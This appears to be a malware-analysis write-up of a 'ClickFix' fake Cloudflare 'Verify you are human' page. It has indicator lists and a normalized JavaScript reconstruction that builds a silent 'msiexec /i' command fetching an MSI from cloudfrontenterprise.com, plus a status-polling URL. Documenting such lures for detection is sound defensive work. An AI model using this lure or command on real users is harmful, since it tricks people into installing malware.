/*
 * ClickFix - fake Cloudflare MSI delivery
 *
 * Classification:
 *   clickfix
 *   fake-cloudflare
 *   msiexec
 *   msi
 *
 * Captured:
 *   2026-08-23
 *
 * SHA256:
 *   91f6a9f136018cf3fbae990c2f3f4a77db4eaff522bdbca9348c25c6a1bf67e7
 *
 * Size:
 *   264403 bytes
 *
 * The VM-obfuscated page presents a fake Cloudflare verification flow and
 * copies a silent msiexec command to the clipboard.
 *
 * Fake Cloudflare verification
 *     |
 *     +-> "Verify you are human"
 *     |
 *     +-> Generate per-visit SID
 *     |
 *     +-> User interaction
 *           |
 *           +-> Win + X
 *           +-> I
 *           +-> Ctrl + V
 *           +-> Enter
 *                 |
 *                 +-> Clipboard command
 *                       |
 *                       +-> msiexec /i
 *                       |
 *                       +-> cloudfrontenterprise.com
 *                             |
 *                             +-> /get/my?sid=<sid>
 *                                   |
 *                                   +-> MSI
 *
 * After clipboard delivery the page polls:
 *
 *   cloudfrontenterprise.com/js-status
 *
 * using the same visit identifier.
 *
 * Infrastructure:
 *
 *   cloudfrontenterprise.com
 *       MSI delivery and execution-status backend
 *
 *   /get/my?sid=<sid>
 *       MSI delivery
 *
 *   /js-status
 *       execution-status polling
 *
 *   gettrumpmemes.gettrumpmemestrendingtokens.com
 *       UI / asset infrastructure observed in the sample
 *
 * Browser state:
 *
 *   localStorage.iframeShown
 *   sessionStorage.iframeShown
 *
 * Useful pivots:
 *
 *   cloudfrontenterprise.com
 *   /get/my?sid=
 *   /js-status
 *   handleCmdCheck_
 *   iframeShown
 *   "Additional Verification Required"
 *   "Verify you are human"
 *   "msiexec /i"
 *   "/qn"
 *
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const DELIVERY_ORIGIN =
        "https://cloudfrontenterprise.com";

    const PAYLOAD_PATH =
        "/get/my";

    const STATUS_PATH =
        "/js-status";

    const ASSET_HOST =
        "gettrumpmemes.gettrumpmemestrendingtokens.com";

    const STORAGE_KEY =
        "iframeShown";

    /*
     * The original VM creates a per-visit identifier with a timestamp
     * and random suffix.
     *
     * Observed example:
     *
     *   1787484319691-khzqzzba
     */
    function createSid() {
        const random =
            Math.random()
                .toString(36)
                .slice(2, 10);

        return (
            Date.now() +
            "-" +
            random
        );
    }

    /*
     * Command copied into the victim clipboard.
     */
    function buildCommand(sid) {
        const payloadUrl =
            DELIVERY_ORIGIN +
            PAYLOAD_PATH +
            "?sid=" +
            encodeURIComponent(sid);

        return (
            'msiexec /i "' +
            payloadUrl +
            '" /qn'
        );
    }

    /*
     * The page uses JSONP-style status polling after clipboard delivery.
     *
     * Observed shape:
     *
     *   /js-status
     *       ?callback=handleCmdCheck_<sid>
     *       &sid=<sid>
     *       &id=<id>
     */
    function buildStatusUrl(
        sid,
        id = sid
    ) {
        const parameters =
            new URLSearchParams({
                callback:
                    "handleCmdCheck_" +
                    sid,

                sid,
                id
            });

        return (
            DELIVERY_ORIGIN +
            STATUS_PATH +
            "?" +
            parameters.toString()
        );
    }

    /*
     * Record that the ClickFix presentation has been shown.
     */
    function markShown() {
        localStorage.setItem(
            STORAGE_KEY,
            "true"
        );

        sessionStorage.setItem(
            STORAGE_KEY,
            "true"
        );
    }

    /*
     * Recovered delivery state.
     */
    function buildDeliveryState() {
        const sid =
            createSid();

        return {
            sid,

            command:
                buildCommand(sid),

            statusUrl:
                buildStatusUrl(sid),

            assetHost:
                ASSET_HOST
        };
    }

    /*
     * Recovered presentation:
     *
     *   Verify you are human
     *
     *   Additional Verification Required
     *
     *   1. Win + X
     *   2. I
     *   3. Ctrl + V
     *   4. Enter
     */
    const delivery =
        buildDeliveryState();

    /*
     * Original VM entry points:
     *
     *   vmP_340ad0
     *   vmv_f77f8b
     */

    void delivery;
    void markShown;
})();
